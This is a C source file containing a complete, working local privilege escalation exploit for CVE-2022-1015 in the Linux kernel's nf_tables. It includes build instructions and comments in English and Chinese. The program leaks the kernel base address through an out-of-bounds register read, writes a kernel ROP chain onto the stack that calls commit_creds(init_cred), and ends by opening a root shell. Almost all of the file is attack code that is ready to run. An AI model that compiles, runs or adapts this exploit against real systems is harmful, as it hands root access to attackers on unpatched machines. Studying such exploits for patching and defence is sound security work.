// gcc -static ./pwn.c ./helpers.c -lmnl -lnftnl -o pwn 
#define _GNU_SOURCE 1
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <stddef.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/mman.h>
#include <sched.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include "helpers.h"
#define LEAK_BASE_OFFSET 0x9f425d // 0x9ac3ec

struct vuln_expr_params {
    uint32_t min_len;
    uint32_t max_len;
    uint32_t value;
};

void error(char *msg)
{
    perror(msg);
    exit(EXIT_FAILURE);
}
// setup_nftables() —— create table & chain
void setup_nftables(struct mnl_socket* nl, char* table_name, char* base_chain_name, int* seq)
{
    if (create_table(nl, table_name, AF_INET, seq, NULL) == -1) 
        error("Failed creating table");
    printf("[+] Created nft %s\n", table_name);

    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_OUT;
    bp.prio = 10;

    if (create_chain(nl, table_name, base_chain_name, NFPROTO_IPV4, &bp, seq, NULL))
        error("Failed creating base chain");
    printf("[+] Created base ipv4 chain %s\n", base_chain_name);
}
// calc_vuln_expr_params_div() —— 计算可写的范围, 以及是否能将值 desired 写入到 sreg
static int calc_vuln_expr_params_div(struct vuln_expr_params* result, uint8_t desired, uint32_t min_len, uint32_t max_len, int shift)
{
    uint64_t base_ = (uint64_t)(1) << (32 - shift);
    uint32_t base = (uint32_t)(base_ - 1);

    if (base == 0xffffffff)
        base = 0xfffffffb; // max actual value 

    for (;;) {
        uint64_t computed = (base * 4) & 0xffffffff;
        uint64_t max_value = computed + (uint64_t)(max_len);
        if (max_value < ((uint64_t)(1) << 32)) 
            break;

        if ( (base & 0xff) != desired) {       // 检查能否将值 desired 写入到 sreg
            base--;
            continue;
        }

        uint32_t len_at_least = ((uint64_t)1 << 32) - computed;
        uint32_t len_at_most  = len_at_least + 0x50; 
        
        if (min_len > len_at_least) 
            len_at_least = min_len;

        if (max_len < len_at_most) 
            len_at_most = max_len;

        result->max_len = len_at_most;
        result->min_len = len_at_least;
        result->value = base + 4;
        return 0;
    }
    return -1;
}

static int calc_vuln_expr_params(struct vuln_expr_params *result, uint8_t desired, uint32_t min_len, uint32_t max_len)
{
    for (int i = 0; i < 3; ++i) {   // 不需要循环，乘以4之后结果都一样
        int res = calc_vuln_expr_params_div(result, desired, min_len, max_len, i);
        if (!res)
            return 0;
    }
    return -1;
}
// create_base_chain_rule() —— create rule to get specific packet (specified port & magic value)
#define MAGIC 0xdeadbeef0badc0de
int create_base_chain_rule(struct mnl_socket* nl, char* table_name, char* chain_name, uint16_t family, uint64_t* handle, int* seq)
{
    struct nftnl_rule* r = build_rule(table_name, chain_name, family, handle);

// 1. 添加rule获取目的端口 (保存到 register 8): UDP header 的目的端口位于偏移2处, 占2字节长
    rule_add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, offsetof(struct udphdr, dest), sizeof(uint16_t), 8);

// 2. 若目标端口不匹配, 则rule会接收该包, 避免 server socket 发包带来的噪声; 
    // 注意: server socket 和 client socket 端在 do_chain() 中的栈结构不同
    uint16_t dest_port = htons(9999);
    rule_add_cmp(r, NFT_CMP_EQ, 8, &dest_port, sizeof dest_port);

// 3. 获取 header 的前8字节，若和 magic 值不匹配, 则rule会接收该包
    // 这样能确保只处理我们想处理的 packet
    // rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, 0, 8, 8);
    rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 0, 8, 8);

    printf("create base chain rule rule_add_payload\n");

    uint64_t magic = MAGIC;
    rule_add_cmp(r, NFT_CMP_EQ, 8, &magic, sizeof magic);

// 4. 若 packet 通过这些检查, 则跳转到 auxiliary chain
    rule_add_immediate_verdict(r,  NFT_GOTO, "aux_chain");
    printf("create base chain rule rule_add_immediate_verdict\n");

    // 将rule提交给内核
    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, family, (void**)&r, seq,
        NULL
    );
}
// create_infoleak_rule() —— create rule to leak and compare with cmp
int create_infoleak_rule(struct mnl_socket* nl, struct nftnl_rule* r, uint8_t cmp, uint8_t pos, uint16_t family, int* seq, int extraflags)
{
    struct vuln_expr_params vuln_params;

// index 0xff -> offset 0x3fc, leak kernel address
    if (calc_vuln_expr_params(&vuln_params, 0xf5,  0x40, 0x40)) 
        error("Could not find correct params to trigger OOB read.");

// shift by pos*8 -> the first byte of the register will be leaked
    uint32_t shift_amt = (pos * 8);
    // printf("min_len: 0x%x,   value:0x%x\n", vuln_params.min_len, vuln_params.value);
    rule_add_bit_shift(r, NFT_BITWISE_RSHIFT, vuln_params.min_len, vuln_params.value, 1, &shift_amt, sizeof shift_amt);
    
// binary search: if the compared value > our supplied value, drop the packet. Else, we accept it.
    rule_add_cmp(r, NFT_CMP_GT, 0x15, &cmp, 1);

    rule_add_immediate_verdict(r, NF_DROP, NULL);

    return send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE | extraflags, family, (void**)&r, seq,
        NULL
    );
}
// do_leak_byte() —— leak 1 byte
#define INFOLEAK_RULE_HANDLE 4
uint8_t do_leak_byte(struct mnl_socket* nl, int client_sock, struct sockaddr_in* addr, char* table_name, char* aux_chain_name, uint8_t pos, int* seq)
{
    uint8_t low = 0;
    uint8_t high = 255;
    uint8_t mid;

    char msg[16] = {};
    char result[16] = {};
    *(uint64_t*)msg = MAGIC;
// 1. binary search
    for (;;) {
        mid = (high + low) / 2;
        printf("bounds (inclusive): [0x%.2hhx, 0x%.2hhx]\n", low, high);

        if (low == high)
            return mid;

// 2. Create a rule that replaces the rule with handle INFOLEAK_RULE_HANDLE 
        struct nftnl_rule* r = build_rule(table_name, aux_chain_name, NFPROTO_IPV4, NULL);
        nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);         // ???
        
// 3. create_infoleak_rule() —— create rule to leak and compare with mid
        if (create_infoleak_rule(nl, r, mid, pos, NFPROTO_IPV4, seq, NLM_F_REPLACE))
            error("Could not replace infoleak rule");
// 4. trigger the above rule
        sendto(client_sock, msg, sizeof msg, 0, (struct sockaddr*)addr, sizeof *addr);
// 5. judge the leak value range according to drop/accept the packet
        struct sockaddr_in presumed_server_addr;
        socklen_t presumed_server_addr_len = sizeof presumed_server_addr;

        int nrecv = recvfrom(client_sock, result, sizeof result, 0, (struct sockaddr*)&presumed_server_addr, &presumed_server_addr_len);
        if (!nrecv)
            error("[-] Remote socket closed...");
        else if (nrecv < 0) { 
            // > mid: drop      (In case of timeout, value is greater than `mid`)
            low = mid + 1;
        } else {
            if (strcmp(result, "MSG_OK")) 
                error("[-] Something went wrong...");
            memset(result, 0, sizeof result);
            
            // <= mid: accept
            high = mid;
        }
    }
}
// do_leak() —— leak kernel base
uint32_t do_leak(struct mnl_socket* nl, struct sockaddr_in* addr, char* table_name, char* aux_chain_name, int* seq)
{
    #define CLIENT_HOST "127.0.0.1"
    #define CLIENT_PORT 8888

    int client_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

    struct sockaddr_in client_addr;
    inet_aton(CLIENT_HOST, &client_addr.sin_addr);
    client_addr.sin_port = htons(CLIENT_PORT);
    client_addr.sin_family = AF_INET;

    if (bind(client_sock, (struct sockaddr*)&client_addr, sizeof client_addr) < 0) 
        error("client bind");

// 1. set 100ms receive timeout (can probably be lower)
    struct timespec t = {.tv_sec =  0, .tv_nsec = 1000 * 200};
    setsockopt(client_sock, SOL_SOCKET, SO_RCVTIMEO, &t, sizeof t);
// 2. leak 4 bytes 
    uint8_t results[4] = {};
    for (int i = 1; i < 4; ++i) {
        results[i] = do_leak_byte(nl, client_sock, addr, table_name, aux_chain_name, i, seq);
        printf("[+] Leaked byte %i: %.2hhx\n", i, results[i]);
    }
    
    close(client_sock);
    return *(uint32_t*)results;
}
// leak_handler() —— polling to receive packet
int leak_handler(int fd)
{
    char buf[4096] = {};
    char send_back[] = "MSG_OK";
    struct sockaddr_in client_addr = {};
    socklen_t client_addr_size = sizeof client_addr;
    size_t conn_id = 0;

    for (;;) {
        int len = recvfrom(fd, buf, sizeof buf - 1, 0, (struct sockaddr*)&client_addr, &client_addr_size);
        if (len <= 0) 
            error("listener receive failed..\n");
        
        sendto(fd, send_back, sizeof(send_back), 0, (struct sockaddr*)&client_addr, client_addr_size);
    }

    close(fd);
    return 0;
}

void* new_stack;

static int install_rop_chain_rule(struct mnl_socket* nl, uint64_t kernel_base, char* chain, int* seq)
{
// 1. return address is at regs.data[0xca]
    struct vuln_expr_params v;
    if (calc_vuln_expr_params(&v, 0xe6, 0x00, 0xff))        // 0xca -> 0xe6
        error("[-] Cannot find suitable parameters for planting ROP chain.");  
// 2. write ROP chain (in the packet) at (0xca - 4)*4 = 0x318
    struct nftnl_rule* r = build_rule("exploit_table", chain, NFPROTO_IPV4, NULL);
    //nftnl_rule_set_u64(r, NFTNL_RULE_HANDLE, INFOLEAK_RULE_HANDLE);
    // rule_add_payload(r, NFT_PAYLOAD_INNER_HEADER, 8, v.max_len, v.value);
    rule_add_payload(r, NFT_PAYLOAD_LL_HEADER, 8, v.max_len, v.value);
    
    int err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&r, seq,
        NULL
    );
    
    if (err)
        error("send_batch_request");
    
    return v.max_len;
}

void trigger_rop(struct mnl_socket* nl, uint64_t kernel_base, struct sockaddr_in* magic_addr, int rop_length)
{
    // Structures in .data
    #define INIT_NSPROXY_OFF 0x186d940          // ffffffff8286d940 D init_nsproxy
    #define INIT_CRED_OFF 0x186db80             // ffffffff8286db80 D init_cred
    // Routines in .text
    #define SWITCH_TASK_NAMESPACES_OFF 0xd12b0  // ffffffff810d12b0 T switch_task_namespaces
    #define COMMIT_CREDS_OFF 0xd2690            // ffffffff810d2690 T commit_creds
    #define BPF_GET_CURRENT_TASK_OFF 0x1ef7e0   // ffffffff811ef7e0 T bpf_get_current_task
    #define __DO_SOFTIRQ_OFF 0x1000000          // ffffffff82000000 T __do_softirq
    // Gadgets
    #define MOV_RDI_RAX_OFF 0x2bfb1 // constraint: rcx==0    // 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;  
    #define POP_RDI_OFF 0x92100                 // 0xffffffff81092100: pop rdi; ret;
    #define POP_RSI_OFF 0x223e6                 // 0xffffffff810223e6: pop rsi; ret;
    #define POP_RCX_OFF 0x139a3
    #define POP_RAX_OFF 0x64650                 // 0xffffffff81064650: pop rax; ret;
    #define POP_RBP_OFF 0x6ae                   // 0xffffffff810006ae: pop rbp; ret; 
    #define CLI_OFF 0x6a918                     // 0xffffffff8106a918: cli; ret;
    #define SUB_RSP_0x80 0x3809f6           // 0xffffffff813809f6: sub rsp, -0x80; pop rbx; pop rbp; ret;
    #define SUB_RSP_0x80_POP4  0x5f80e0     // 0xffffffff815f80e0: sub rsp, -0x80; pop rbx; pop r12; pop r13; pop rbp; ret;
    #define ADD_RSO_0xC8 0x3bd8b0           // 0xffffffff813bd8b0: add rsp, 0xc8; pop r12; pop rbp; ret; 
    
    #define PUSH_RSP_POP_RBX 0x1402020      // 0xffffffff82402020: push rsp; pop rbx; add al, 0x67; ret; 
    #define SUB_RBX_MOV_RAX_POP2  0x1525e5  // 0xffffffff811525e5 : sub rbx, rax ; mov rax, rbx ; pop rbx ; pop rbp ; ret
    #define PUSH_RAX_POP_RSP 0x64cfea       // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;
    // Misc.
    #define OLD_TASK_FLAGS_OFF 0x12c1e32 // 0x40010000    0xffffffff822c1e32 <serial_pci_tbl+4850>:	0x0000000040010000

    uint64_t *packet = calloc(1, rop_length + 8);

    packet[0] = 0;  // magic value
    uint64_t* rop = &packet[1];

    // 0xffffffff819d5cda <__netif_receive_skb_one_core+122> ret
    int i = 0;
    printf("rop_length: 0x%x\n", rop_length);
    // #define _rop(x) do { if ((i+1)*8 > rop_length) error("ROP TOO LONG"); rop[i++] = (x); } while (0)
    #define _rop(x)  rop[i++] = (x);
/*
    rop[0] = 0;
    rop[1] = 0;
    rop[2] = kernel_base + POP_RBP_OFF;                 // 0xffffffff810006ae: pop rbp; ret; 
    rop[3] = kernel_base + OLD_TASK_FLAGS_OFF + 0x58;   // 0xffffffff822c1e32 <serial_pci_tbl+4850>:	0x0000000040010000
    rop[4] = kernel_base + __DO_SOFTIRQ_OFF + 418;      // ffffffff82000000 T __do_softirq
    rop[5] = 0;
    rop[6] = 0;
    rop[7] = 0;
    rop[8] = 0;
    rop[9] = 0;
    rop[10] = 0;
    rop[11] = 0;
    rop[12] = 0;
    rop[13] = 0;
    rop[14] = kernel_base + CLI_OFF;                    // 0xffffffff8106a918: cli; ret;
    rop[15] = kernel_base + SUB_RSP_0x80;               // 0xffffffff813809f6: sub rsp, -0x80; pop rbx; pop rbp; ret;
    rop[16] = 0;
    // switch_task_namespaces(current, &init_nsproxy)
    i = 17;
    rop[i++] = kernel_base + BPF_GET_CURRENT_TASK_OFF;  // ffffffff811ef7e0 T bpf_get_current_task
    rop[i++] = kernel_base + MOV_RDI_RAX_OFF;           // 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;
    rop[i++] = 0;
    rop[i++] = 0;
    rop[i++] = kernel_base + POP_RSI_OFF;               // 0xffffffff810223e6: pop rsi; ret;
    rop[i++] = kernel_base + INIT_NSPROXY_OFF;          // ffffffff8286d940 D init_nsproxy
    rop[i++] = kernel_base + SWITCH_TASK_NAMESPACES_OFF;// ffffffff810d12b0 T switch_task_namespaces
    // commit_cred(&init_cred)
    rop[i++] = kernel_base + POP_RDI_OFF;               // 0xffffffff81092100: pop rdi; ret;
    rop[i++] = kernel_base + INIT_CRED_OFF;             // ffffffff8286db80 D init_cred
    rop[i++] = kernel_base + COMMIT_CREDS_OFF;          // ffffffff810d2690 T commit_creds
    rop[i++] = kernel_base + ADD_RSO_0xC8;              // 0xffffffff813bd8b0: add rsp, 0xc8; pop r12; pop rbp; ret; 
*/

    // clear interrupts
    _rop(kernel_base + CLI_OFF);                        // 0xffffffff8106a918: cli; ret;

    // make rbp-0x58 point to 0x40010000
    _rop(kernel_base + POP_RBP_OFF);                    // 0xffffffff810006ae: pop rbp; ret; 
    _rop(kernel_base + OLD_TASK_FLAGS_OFF + 0x58);      // 0xffffffff822c1e32 <serial_pci_tbl+4850>:	0x0000000040010000
    
    // Cleanly exit softirq and return to syscall context 
    _rop(kernel_base + __DO_SOFTIRQ_OFF + 418);         // ffffffff82000000 T __do_softirq
    
// j1: stack frame was 0x60 bytes  —— use 12 ROP to fill
    //for (int j = 0; j < 12; ++j) _rop(0);

    // switch_task_namespaces(current, &init_nsproxy)
    _rop(kernel_base + BPF_GET_CURRENT_TASK_OFF);       // ffffffff811ef7e0 T bpf_get_current_task
    _rop(kernel_base + MOV_RDI_RAX_OFF);                // 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;  
    _rop(0xdeadbeef);
    _rop(0xdeadbeef);
    _rop(kernel_base + POP_RSI_OFF);                    // 0xffffffff810223e6: pop rsi; ret;
    _rop(kernel_base + INIT_NSPROXY_OFF);               // ffffffff8286d940 D init_nsproxy
    _rop(kernel_base + SWITCH_TASK_NAMESPACES_OFF);     // ffffffff810d12b0 T switch_task_namespaces

    // commit_cred(&init_cred)
    _rop(kernel_base + POP_RDI_OFF);        // 0xffffffff81092100: pop rdi; ret;
    _rop(kernel_base + INIT_CRED_OFF);      // ffffffff8286db80 D init_cred
    _rop(kernel_base + COMMIT_CREDS_OFF);   // ffffffff810d2690 T commit_creds

    // pass control to system call stack
    // this is offset +0x70 from our rop chain
    // target is at   +0x168
    _rop(kernel_base + 0x145af2);  // 0xffffffff81145af2: add rsp, 0xd8; pop rbx; pop r12; pop rbp; ret;
    _rop(0xdeadbeef);                       // #12 ROP

// jump to j1
    _rop(kernel_base + 0x21638);      // 0xffffffff81021638 : push rsp ; add eax, 0xc031000b ; pop rbp ; ret
    _rop(kernel_base + 0x45c7c7);     // 0xffffffff8145c7c7 : push rbp ; pop rax ; fcos ; pop rbp ; ret
    _rop(0xdeadbeef);
    _rop(kernel_base + 0x55aba2);     // 0xffffffff8155aba2 : pop r8 ; ret
    _rop(0x70);
    _rop(kernel_base + 0x152428);     // 0xffffffff81152428 : sub rax, r8 ; ret
    _rop(kernel_base + 0x64cfea);     // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;

    /*
    _rop(kernel_base + 0x143fd36);                   // 0xffffffff8243fd36: push rsp; pop rdi; mov ebp, 0x68d9f4d3; ret;   不可执行!!!!!
    _rop(kernel_base + 0x223e6);                     // 0xffffffff810223e6: pop rsi; ret;
    _rop(0x60+0x10+0x10 - 0x30);
    _rop(kernel_base + 0x990dab);                   // 0xffffffff81990dab : sub rdi, rsi ; pop rbp ; lea rax, [rdi - 0x30] ; ret
    _rop(0xdeadbeef);
    _rop(kernel_base + 0x64cfea);                         // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;
    */

    //_rop(kernel_base + SUB_RSP_0x80_POP4);              // 0xffffffff815f80e0: sub rsp, -0x80; pop rbx; pop r12; pop r13; pop rbp; ret;
    /*
    _rop(kernel_base + PUSH_RSP_POP_RBX);                // 0xffffffff82402020: push rsp; pop rbx; add al, 0x67; ret;      不可执行!!!!!
    _rop(kernel_base + POP_RAX_OFF);                     // 0xffffffff81064650: pop rax; ret;
    _rop(0x60+0x10+0x10);
    _rop(kernel_base + SUB_RBX_MOV_RAX_POP2);            // 0xffffffff811525e5 : sub rbx, rax ; mov rax, rbx ; pop rbx ; pop rbp ; ret
    _rop(0xdeadbeef);
    _rop(0xdeadbeef);
    _rop(kernel_base + PUSH_RAX_POP_RSP);                              // 0xffffffff8164cfea: push rax; add eax, 0x74030000; add al, 0x41; pop rsp; pop rbp; ret;
    */
    // We're already on 128 bytes here 


    int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    puts("Triggering payload..");
    sendto(s, packet, rop_length + 8, 0, (struct sockaddr*)magic_addr, sizeof *magic_addr);
}

int main(int argc, char** argv, char** envp)
{
// 1. initialize
// 1-1. unshare - namespace
    if (argc < 2) {
        puts("[+] Dropping into network namespace");
        
        // We're too lazy to perform uid mapping and such.
        char* new_argv[] = {
            "/usr/bin/unshare",
            "-Urn",
            argv[0],
            "EXPLOIT",
            NULL
        };

        execve(new_argv[0], new_argv, envp);
        puts("Couldn't start unshare wrapper..");
        exit(EXIT_FAILURE);
    }

    // I'm too lazy to talk to NETLINK_ROUTE..
    system("ip link set dev lo up");
// 1-2. setup netlink & nftables
    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);

    if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) < 0) {
        perror("[-] mnl_socket_bind");
        puts("[-] Are you sure you have CAP_NET_ADMIN?..");
        exit(EXIT_FAILURE);
    }
    int seq = time(NULL);
    int err;
// 1-3. create rule to get specific packet (specified port 9999 & MAGIC value)
    char *table_name = "exploit_table", *base_chain_name = "base_chain", *aux_chain_name = "aux_chain";
    // create base_chain
    setup_nftables(nl, table_name, base_chain_name, &seq);
    // create auxilitary chain
    if (create_chain(nl, table_name, aux_chain_name, NFPROTO_IPV4, NULL, &seq, NULL)) 
        error("Failed creating auxiliary chain");
    printf("[+] Created auxiliary chain %s\n", aux_chain_name);
    // base_chain rule
    if (create_base_chain_rule(nl, table_name, base_chain_name, NFPROTO_IPV4, NULL, &seq)) 
        error("Failed creating base chain rule");
    puts("[+] Created base chain rule");
// 2. test if the kernel is vulnerable
// make a rule (latter use leak rule to replace it)   
    struct vuln_expr_params v;

// 2-1. offset 0xca and len 0xff is OOB (0xca * 4 = 0x328 ret_addr offset)  calculate overflow range
    if (calc_vuln_expr_params(&v, 0xca, 0x00, 0xff))
        error("[-] Something went horribly wrong...");
// 2-2. 创建rule: 把 packet 中 8~max_len 字节读取到偏移寄存器 (v.value-4)*4 处 (往栈上写数据)
    struct nftnl_rule* aux_rule = build_rule(table_name, aux_chain_name, NFPROTO_IPV4, NULL);
    // rule_add_payload(aux_rule, NFT_PAYLOAD_INNER_HEADER, 8, v.max_len, v.value);
    rule_add_payload(aux_rule,  NFT_PAYLOAD_LL_HEADER, 8, v.max_len, v.value);

    err = send_batch_request(
        nl,
        NFT_MSG_NEWRULE | (NFT_TYPE_RULE << 8),
        NLM_F_CREATE, NFPROTO_IPV4, (void**)&aux_rule, &seq,
        NULL
    );
    if (err) // 如果能成功创建rule, 说明越界的值 v.value 能够传递到内核, 存在漏洞
        error("[-] TARGET IS NOT VULNERABLE to CVE-2022-1015!");

    puts("[+] Succesfully created rule with OOB nft_payload!");
    puts(CLR_GRN "[+] TARGET IS VULNERABLE to CVE-2022-1015!" CLR_RESET);
// 3. leak kernel base
// 3-1. setup listening process to receive packet
    #define SERVER_HOST "127.0.0.1"
    #define SERVER_PORT 9999
    int pid = setup_listener(SERVER_HOST, SERVER_PORT, leak_handler);  // leak_handler() —— polling to receive packet
// 3-2. leak kernel base    
    struct sockaddr_in server;
    inet_aton(SERVER_HOST, &server.sin_addr);
    server.sin_port = htons(SERVER_PORT);
    server.sin_family = AF_INET;

    uint32_t leak = do_leak(nl, &server, table_name, aux_chain_name, &seq);
    // first byte might fail due to buggy carry implementation with shift_amt = 0
    // so we just set it. The LSB will always remain constant.
    uint64_t kernel_addr = 0xffffffff00000000 + leak + (LEAK_BASE_OFFSET & 0xff);
    printf("Leaked address: 0x%lx\n", kernel_addr);
    uint64_t kernel_base = kernel_addr - LEAK_BASE_OFFSET;
    if ((kernel_base & 0xfffff) != 0) {
        puts("[-] Leak failed.");
        puts("[-] Try changing offsets / lengths / chain types.");
        error("[-] If all leaked bytes were ff, this is probably because of corrupted loopback state.. RIP");
    }

    printf("[+] Kernel base @ 0x%.16lx\n", kernel_base);
    stop_listener(pid);
    // int x;
    // scanf("%d", &x);
// 4. write ROP chain (from packet) at the ret_addr
    struct unft_base_chain_param bp;
    bp.hook_num = NF_INET_LOCAL_IN;
    bp.prio = 10;
    if (create_chain(nl, table_name, "base_chain_2", NFPROTO_IPV4, &bp, &seq, NULL)) 
        error("Failed adding second base chain");

    err = install_rop_chain_rule(nl, kernel_base, "base_chain_2", &seq);
    if (err < 0) 
        error("[-] Could not install ROP chain");
// 5. send packet to trigger rop chain
    new_stack = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) + 0x3ff0;
    trigger_rop(nl, kernel_base, &server, err);

    system("id");
    system("sh");  
}